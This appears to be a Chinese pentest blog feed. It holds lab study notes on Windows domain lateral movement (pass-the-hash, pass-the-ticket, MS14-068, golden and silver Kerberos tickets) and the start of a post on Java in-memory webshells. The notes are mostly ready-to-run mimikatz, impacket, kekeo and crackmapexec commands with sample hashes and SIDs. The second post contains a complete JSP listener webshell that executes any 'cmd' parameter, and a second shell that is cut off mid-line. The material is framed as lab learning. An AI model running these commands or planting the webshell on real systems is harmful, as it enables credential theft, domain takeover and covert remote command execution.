title="前置"></a>前置</h3><p>要学习PTH需要知道一些windows认证的相关只是</p><p><a href="https://www.cnblogs.com/404p3rs0n/p/15609556.html#00x01windows%E4%B9%8Bntlm%E8%AE%A4%E8%AF%81">window认证1</a></p><p><a href="https://www.adminxe.com/733.html">windows认证2</a></p><p>windows本地有个存密码的地方–&gt;sum</p><p><img src="https://bu.dusays.com/2024/10/11/670933e97f5f2.png" alt="image-20240927231011394"></p><p>这个里面存放着密码的hash</p><p>在windows里面 密码的hash称之为NTML hash</p><p>在NTML协议存在之前 他的前身叫LM协议</p><p>两个的差别在于加密方式不同</p><p>LM协议更容易被破解</p><p>NTML协议是一种网络认证协议 它是基于挑战&#x2F;相应认证机制的一种认证模式  它只支持Windows</p><p><img src="https://bu.dusays.com/2024/10/11/670933f5e2a2f.png" alt="image-20240927231948264"></p><h3 id="PTH-1"><a href="#PTH-1" class="headerlink" title="PTH"></a>PTH</h3><p>PTH:pass the hash(哈希传递)通过密码散列值（通常是NTLM Hash）来进行攻击</p><p>PTH是能够在不需要账户明文密码的情况下完成认证的一种技术</p><p>它解决了我们渗透中获取不到明文密码、破解不了NTML hash而又想扩大战果的问题</p><p>在域环境中，用户登录计算机时使用的账号，计算机会用相同的本地管理员账号和密码 两个账号密码类似因此，<strong>如果计算机的本地管理员账密是相同的，我们就可以使用哈希传递的方法登录到内网的其他主机</strong></p><blockquote><p>windows server 2012 R2   之前   LM或NTLM</p><p>windows server 2012 R2   之后NTLM</p></blockquote><h3 id="mimikatz进行PTH攻击"><a href="#mimikatz进行PTH攻击" class="headerlink" title="mimikatz进行PTH攻击"></a>mimikatz进行PTH攻击</h3><p>需要交互式shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br><span class="line"></span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933f3753ab.png" alt="image-20240927235133453"></p><p>通信是在本地</p><p>但是我们有凭证 可以直接查看目标根目录</p><p><img src="https://bu.dusays.com/2024/10/11/670933f04995c.png" alt="image-20240927235322177"></p><p>复制文件</p><p><img src="https://bu.dusays.com/2024/10/11/670933e283f77.png" alt="image-20240927235550964"></p><h3 id="impacket进行PTH攻击"><a href="#impacket进行PTH攻击" class="headerlink" title="impacket进行PTH攻击"></a>impacket进行PTH攻击</h3><p>套件可以在CS上执行</p><p>所以</p><ul><li>exe上传</li><li>socks代理无文件落地</li></ul><p>先建立socks代理</p><p><img src="https://bu.dusays.com/2024/10/11/670933ec30a90.png" alt="image-20240928002058523"></p><p><img src="https://bu.dusays.com/2024/10/11/670933e2cc199.png" alt="image-20240928002915710"></p><p>代理配置</p><p><img src="https://bu.dusays.com/2024/10/11/670933e97ee42.png" alt="image-20240928003005015"></p><h4 id="psexec-1"><a href="#psexec-1" class="headerlink" title="psexec"></a>psexec</h4><p>使用套件的psexec.py</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python psexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure><p>已进入</p><p><img src="https://bu.dusays.com/2024/10/11/670933f628a50.png" alt="image-20240928003254127"></p><p>其他服务同理</p><h4 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python smbexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933e9800a3.png" alt="image-20240928003736029"></p><h4 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python wmiexec.py -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933f67e5b6.png" alt="image-20240928003858696"></p><h3 id="crackMapExec-PTH"><a href="#crackMapExec-PTH" class="headerlink" title="crackMapExec-PTH"></a>crackMapExec-PTH</h3><p>这是那个密码喷洒的工具</p><p>它同样可以进行pth攻击</p><p>密码喷洒，域用户登录pth</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains crackmapexec cme smb 192.168.3.21-32 -u user.txt -H 518b98ad4178a53695dc997aa02d455c #域用户HASH登录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxychains crackmapexec cme smb 192.168.3.21-32 -u administrator -H 518b98ad4178a53695dc997aa02d455c --local-auth #本地用户HASH登录</span><br></pre></td></tr></table></figure><h2 id="PTK"><a href="#PTK" class="headerlink" title="PTK"></a>PTK</h2><p>PTK: pass the key  <strong>当系统安装了KB2871997补丁并且禁用NTLM的时候</strong>，虽然此时我们抓取到的ntlm hash  就失效了，但是可以通过PTK进行攻击</p><p>未找到相应环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::ekeys #获取key</span><br><span class="line"></span><br><span class="line">mimikatz sekurlsa::pth /user:域用户名 /domain:域名 /aes256:aes256值</span><br></pre></td></tr></table></figure><h2 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h2><p>PASS THE TICKET</p><p>有三种攻击方式</p><ul><li>漏洞-MS14068</li><li>KEKEO</li><li>mimikatz</li></ul><h3 id="MS14068"><a href="#MS14068" class="headerlink" title="MS14068"></a>MS14068</h3><p><strong>自己做一张票据</strong></p><p>只需要普通用户权限就可以实施攻击</p><p>KDC服务(密钥分发中心)的漏洞</p><p>原理：它允许身份验证的用户在kerberos票证里面插入任意的PAC，用户可以通过呈现具有改变的PAC的kerberos TGT来获得票证</p><p>首先 我们需要admin的sid值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami/user</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/67093410b4dde.png" alt="image-20241002195826304"></p><p>这里的sid是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S-1-5-21-1218902331-2157346161-1782232778-1132</span><br></pre></td></tr></table></figure><p>我们可以基于这个sid值在本地生成一个票据文件</p><p>github上找一个ms14-068的poc</p><p><img src="https://bu.dusays.com/2024/10/11/670934142c29d.png" alt="image-20241002200503026"></p><p>-u：用户和域名</p><p>-s：这个用户对应的sid值</p><p>-d：域控对应内网id</p><p>-p：用户对应密码</p><p>可以看到已经生成了一个TGT</p><p><img src="https://bu.dusays.com/2024/10/11/6709340d89888.png" alt="image-20241002200658162"></p><p>查看一下当前票据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340dc82aa.png" alt="image-20241002200833003"></p><p>现在是没有的</p><p>好 先把我们本地生成的TGT传到我们已控制的主机上来 这里是webserver</p><p><img src="https://bu.dusays.com/2024/10/11/670934118dae9.png" alt="image-20241002201139741"></p><p>但是现在的票据还只是在主机的文件夹里</p><p>我们通过mimikatz导入TGT</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ptc TGT文件名</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340db47bc.png" alt="image-20241002201606144"></p><p><img src="https://bu.dusays.com/2024/10/11/6709340ef1e18.png" alt="image-20241002201625291"></p><p>好 这样的话就注入成功了</p><p>klist看下票据</p><p><img src="https://bu.dusays.com/2024/10/11/6709340e11654.png" alt="image-20241002201719834"></p><p>已经有了新票据</p><p>读一下域控c盘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir \\OWA2010CN-GOD\c$</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340de316c.png" alt="image-20241002202108977"></p><p>访问成功</p><p>清空票据：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340de1412.png" alt="image-20241002202251074"></p><p>但是DC域控如果打过对应的漏洞补丁，那这种方法就不行了</p><p>拿下域控就好说了</p><p>可以直接copy命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy shell.exe \\OWA2010CN-GOD\c$</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340f7bc3a.png" alt="image-20241002203417802"></p><p>过来了</p><h3 id="KEKEO"><a href="#KEKEO" class="headerlink" title="KEKEO"></a>KEKEO</h3><p>要求：<strong>高权限</strong>  </p><p>原理：因为当前主机在以前的时间内肯定会和其他主机产生过连接，所以本地应该就生成了一些票据，我们可以导出这些票据，然后再导入这些票据进行利用</p><p>缺点：票据是有有效期的，如果在有效期内连接过域控的话，就可以使用这些票据</p><p>首先我们先把kekeo这个工具传到我们控制的webserver上</p><p>导出票据：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:Administrator /domain:god.org /ntlm:ccef208c6485269c20db2cad21734fe7&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>kekeo和mimikatz都会进入到工具里面 然后再输入命令 执行 </p><p>所以这里我们直接加一个exit 让他执行完命令后退出</p><p>这个NTLM哈希就是这个administrator在GOD域内的hash</p><p><img src="https://bu.dusays.com/2024/10/11/6709340eea1db.png" alt="image-20241002204250442"></p><p>执行成功</p><p><img src="https://bu.dusays.com/2024/10/11/670934114a90f.png" alt="image-20241002204345364"></p><p>可以看到在webserver的桌面上多了两个票据文件</p><p><img src="https://bu.dusays.com/2024/10/11/6709340d9bd90.png" alt="image-20241002204433553"></p><p>导入这个administrator的票据</p><p>这里我们还是使用这个kekeo来</p><p>导入票据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kekeo &quot;kerberos::ptt TGT_Administrator@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p>当然你用mimikatz也是一样的</p><p><img src="https://bu.dusays.com/2024/10/11/670934114a90f.png" alt="image-20241002204817138"></p><p>可以看到 成功</p><p>klist也有票了</p><p><img src="https://bu.dusays.com/2024/10/11/6709340f881b2.png" alt="image-20241002204915621"></p><p>有票了</p><p>那么访问也是没有问题的了</p><p><img src="https://bu.dusays.com/2024/10/11/6709340d8bbc0.png" alt="image-20241002204949543"></p><p>只要我们抓到一张域控administator的票 那么域内所有主机都可以通过这个票访问到DC</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>mimikatz同样可以抓到历史票据</p><p>但是不知道票据是否过期(10h)</p><p>导出票据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>导入票据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ptt C:\Users\webadmin\Desktop\[0;3e4]-0-0-40a40000-WEBSERVER$@cifs-owa2010cn-god.god.org.kirbi</span><br></pre></td></tr></table></figure><p>其他的一样了</p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>实际上黄金票据和白银票据都是在权限维持里</p><p>黄金票据就是伪造krbtgt用户的TGT票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户</p><p>且黄金票据不会受到TGT生命周期的影响（默认10小时，最长续订一周）</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>拿到域控  适合做权限维持</li><li>有krbtgt用户(这是一个域控用户)的hash值(aeshash ntmlhash等 后面要指定一下算法)</li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先拿到我们需要的域内信息</p><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>这个随便获取 就不多说了</p><h4 id="域的SID值"><a href="#域的SID值" class="headerlink" title="域的SID值"></a>域的SID值</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami/user</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340de31fc.png" alt="image-20241009104508236"></p><p><strong>注意 这个SID最后面这个-500表示的是这个用户 所以域的SID值 要把-500去掉</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami/all</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670934139f049.png" alt="image-20241009104724113"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/67093412c16a9.png" alt="image-20241009104811055"></p><p>三种方法都可以</p><p>包括cs插件 都可以</p><h4 id="域的KRBTGT账户hash"><a href="#域的KRBTGT账户hash" class="headerlink" title="域的KRBTGT账户hash"></a>域的KRBTGT账户hash</h4><p>mimikatz直接抓密码</p><p>先开权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340dbd4ed.png" alt="image-20241009105310851"></p><p>然后就可以抓hash了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::lsa /patch</span><br></pre></td></tr></table></figure><p>找到</p><p><img src="https://bu.dusays.com/2024/10/11/6709340e0aa11.png" alt="image-20241009105528944"></p><p>b097d7ed97495408e1537f706c357fc5</p><p>还可以指定查krbtgt用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:god.org /user:krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670934118de79.png" alt="image-20241009105803897"></p><h4 id="伪造用户"><a href="#伪造用户" class="headerlink" title="伪造用户"></a>伪造用户</h4><p>我们可以伪造域内任意用户 除了krbtgt</p><p>看下域内用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670934110cd44.png" alt="image-20241009105955011"></p><p>比如说 这里我们伪造一下webadmin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:需要伪造的用户 /domain:域名 /sid:域sid /krbtgt:krbtgt用户的ntlm哈希 /ticket:生成的票据名称</span><br></pre></td></tr></table></figure><p>好</p><p>我们生成票据是不需要高权限的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /user:webadmin /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /krbtgt:b097d7ed97495408e1537f706c357fc5 /ticket:404.kirbi</span><br></pre></td></tr></table></figure><p>这个.kirbi是票据的默认后缀 加不加无所谓</p><p><img src="https://bu.dusays.com/2024/10/11/6709340dcec39.png" alt="image-20241009110357646"></p><p>生成成功</p><p><img src="https://bu.dusays.com/2024/10/11/670934101a8a7.png" alt="image-20241009110418147"></p><h4 id="导入票据"><a href="#导入票据" class="headerlink" title="导入票据"></a>导入票据</h4><p>用mimikatz导入票据即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::ptt 404.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340e5e5cb.png" alt="image-20241009110642513"></p><p>webadmin访问域控成功</p><p><img src="https://bu.dusays.com/2024/10/11/670934135bede.png" alt="image-20241009110714898"></p><p>cs本身也可以生成黄金票据</p><p><img src="https://bu.dusays.com/2024/10/11/6709340ee6c4e.png" alt="image-20241009111131361"></p><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>黄金票据是伪造TGT（门票发放票），而<strong>白银票据则是伪造ST</strong>（门票），这样的好处是门票不会经过KDC，从而更加隐蔽，但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等</p><h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>拿下域控</li></ul><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><h4 id="域名-1"><a href="#域名-1" class="headerlink" title="域名"></a>域名</h4><p>同样的 就不多说了</p><h4 id="域SID"><a href="#域SID" class="headerlink" title="域SID"></a>域SID</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami/user</span><br><span class="line">whoami/all</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>三个命令都可以</p><h4 id="目标服务器FQDN"><a href="#目标服务器FQDN" class="headerlink" title="目标服务器FQDN"></a>目标服务器FQDN</h4><p>就是目标计算机的全名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340f81031.png" alt="image-20241009113002960"></p><p><strong>注意 计算机名是计算机名 计算机全名是计算机全名</strong></p><h4 id="可利用的服务"><a href="#可利用的服务" class="headerlink" title="可利用的服务"></a>可利用的服务</h4><p><img src="https://bu.dusays.com/2024/10/11/67093411d7123.png" alt="image-20241009113143825"></p><p>根据这个图来</p><p>比如说CIFS(磁盘共享服务)</p><p>这个一般都是开着的</p><h4 id="抓服务账号hash"><a href="#抓服务账号hash" class="headerlink" title="抓服务账号hash"></a>抓服务账号hash</h4><p>还是mimikatzs就行</p><p>开debug</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug</span><br></pre></td></tr></table></figure><p>抓hash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340e0b9cc.png" alt="image-20241009113605453"></p><p>我们需要的域内账户 名字是带有$的 </p><p><strong>需要的是指定机器的NTLM hash 通常情况下，本地机器的名后面会带有一个<code>$</code></strong></p><h4 id="伪造用户-1"><a href="#伪造用户-1" class="headerlink" title="伪造用户"></a>伪造用户</h4><p>同样是伪造任意用户</p><p>这里我们还是伪造webadmin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:域名 /sid:域sid /target:目标计算机全名 /rc4:服务账号的NTML HASH /service:可利用的服务 /user:要伪造的用户 /ptt</span><br></pre></td></tr></table></figure><p>这里的&#x2F;ptt就是生成了票据后自动导入 </p><p>我们也可以用黄金票据那个 指定名字 生成在本地 再自己导入</p><p><strong>但是白银票据是收到票据周期的影响的</strong> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::golden /domain:god.org /sid:S-1-5-21-1218902331-2157346161-1782232778 /target:OWA2010CN-God.god.org /rc4:a3a8b24a2de322c7de77f7471e9e34d6 /service:cifs /user:webadmin /ptt</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/6709340de9ce6.png" alt="image-20241009114320589"></p><p>可以看到票已经过来了</p><p><img src="https://bu.dusays.com/2024/10/11/6709340f4785e.png" alt="image-20241009114356041"></p><p>成功访问到域控</p><p><img src="https://bu.dusays.com/2024/10/11/6709340e0e4fa.png" alt="image-20241009114417849"></p><h3 id="黄金票据与白银票据区别"><a href="#黄金票据与白银票据区别" class="headerlink" title="黄金票据与白银票据区别"></a>黄金票据与白银票据区别</h3><p>获取的权限不同</p><ul><li>黄金票据：是直接抓取域控中ktbtgt账号的hash，来在client端生成一个TGT票据，那么<strong>该票据是针对所有机器的所有服务</strong>。</li><li>白银票据：实际就是在抓取到了域控服务hash的情况下，在client端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,<strong>只能访问指定的target机器中指定的服务</strong>。</li></ul><p>认证流程不同</p><ul><li><p>黄金：同KDC交互，但不同AS交互</p></li><li><p>白银：不同KDC交互，直接访问Sever</p></li></ul><p>加密方式不同</p><ul><li><p>黄金：由krbtgt  NTLM HASH 加密</p></li><li><p>白银：由服务账号 NTLM HASH加密</p></li></ul><p>域委派攻击</p><p><a href="https://github.com/coco413/SecMind">好项目</a></p><p>整个内网学下来 还是挺会的 但又不是那么会 而且肯定不会太符合红队的无感渗透 很多情况下都会用到工具 线程也太大了 而且这个横向移动没有权限提升和权限维持学的深刻 有些地方没有深入的学 就比如说kerberos协议啊这种 更多的偏向是使用工具怎么打</p><p>后续还会补充学习这边</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 域渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 内网 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 横向移动 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java内存马</title>
      <link href="/2024/10/11/java%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2024/10/11/java%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="web权限维持"><a href="#web权限维持" class="headerlink" title="web权限维持"></a>web权限维持</h1><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>webshell内存马是把木马和后门写在内存中 然后去执行 达到webshell</p><p>可以加强攻击的隐蔽性和排查难度</p><h3 id="java内存马"><a href="#java内存马" class="headerlink" title="java内存马"></a>java内存马</h3><p><a href="https://blog.csdn.net/weixin_44604541/article/details/118673593">相关文章</a></p><h4 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h4><p>java在进行web服务时 有三大件开启</p><p><img src="https://bu.dusays.com/2024/10/11/670931a90f4a5.png" alt="image-20240912163430370"></p><p>启动的顺序为listener-&gt;Filter-&gt;servlet</p><ul><li><p>Servlet 是运行在 Web 服务器或应用服务器上的程序，作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层，负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</p></li><li><p>Filter，过滤器，是对Servlet技术的一个强补充，其主要功能是</p><ul><li>在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据</li><li>在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据</li></ul></li><li><p>JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件</p><ul><li>可以使用监听器监听客户端的请求、服务端的操作等</li><li>可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等</li></ul></li></ul><p>所以</p><p>Java的内存马可以在这三个方向做文章</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>找了个可以用java内存马打的靶场</p><p>tomcat的</p><p><img src="https://bu.dusays.com/2024/10/11/670931a7cc260.png" alt="image-20240912165112809"></p><p>这里模拟的是一个文件上传的功能点</p><p>我们可以通过内存马打入目标服务器</p><p>添加tomcat配置</p><p><img src="https://bu.dusays.com/2024/10/11/670931aa55f81.png" alt="image-20240912165558670"></p><p>应用</p><p>jdk配的是8u65</p><p><img src="https://bu.dusays.com/2024/10/11/670931a78b036.png" alt="image-20240912165843381"></p><h4 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h4><h5 id="监听器内存马"><a href="#监听器内存马" class="headerlink" title="监听器内存马"></a>监听器内存马</h5><p>监听器是请求服务的第一个位置 这意味着我们只要请求就会触发</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    java.lang.reflect.<span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) field.get(obj);</span><br><span class="line">    <span class="comment">//获取ApplicationContext</span></span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) field.get(applicationContext);</span><br><span class="line">    <span class="comment">//获取StandardContext</span></span><br><span class="line">    <span class="type">ListenerDemo</span> <span class="variable">listenerdemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListenerDemo</span>();</span><br><span class="line">    <span class="comment">//创建能够执行命令的Listener</span></span><br><span class="line">    standardContext.addApplicationEventListener(listenerdemo);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerDemo</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;requestDestroyed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;requestInitialized&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e )&#123;</span><br><span class="line">                <span class="comment">//e.printStackTrace();</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>通过反射机制在Tomcat服务器中绕过正常的安全限制，来动态地向一个Web应用程序添加事件监听器，并在这个监听器中执行任意系统命令。</p><ol><li>获取<code>ServletContext</code>并反射获取<code>ApplicationContext</code>和<code>StandardContext</code><ul><li>通过<code>request.getServletContext()</code>获取当前Web应用的<code>ServletContext</code>对象。</li><li>使用反射机制访问<code>ServletContext</code>对象中的<code>context</code>字段（这里假设<code>context</code>字段存在，实际上<code>ServletContext</code>类并没有直接暴露这样的字段，这里可能是为了示例而假设的）。</li><li>将<code>context</code>字段的值（假设为<code>ApplicationContext</code>类型）转换为<code>ApplicationContext</code>，并再次使用反射访问其<code>context</code>字段，这次将其值转换为<code>StandardContext</code>。</li></ul></li><li>创建并执行任意命令的监听器<ul><li>在JSP页面中定义了一个名为<code>ListenerDemo</code>的内部类，它实现了<code>ServletRequestListener</code>接口。这个接口允许监听器在Servlet请求被初始化和销毁时接收通知。</li><li>在<code>requestInitialized</code>方法中，监听器尝试从HTTP请求中获取名为<code>cmd</code>的参数，并使用<code>Runtime.getRuntime().exec(cmd)</code>执行这个命令。这允许任何能够向这个Web应用发送HTTP请求的用户执行服务器上的任意命令。</li></ul></li><li>向Web应用添加监听器<ul><li>使用<code>standardContext.addApplicationEventListener(listenerdemo);</code>将<code>ListenerDemo</code>实例作为事件监听器添加到Web应用中。这意味着每当有新的请求进入时，<code>ListenerDemo</code>的<code>requestInitialized</code>方法都会被调用，尝试执行请求中指定的命令。</li></ul></li></ol><p>同理</p><p>另一个内存马</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;!-- <span class="number">1</span>、exec <span class="built_in">this</span>--&gt;</span><br><span class="line">&lt;!-- <span class="number">2</span>、request any url with a 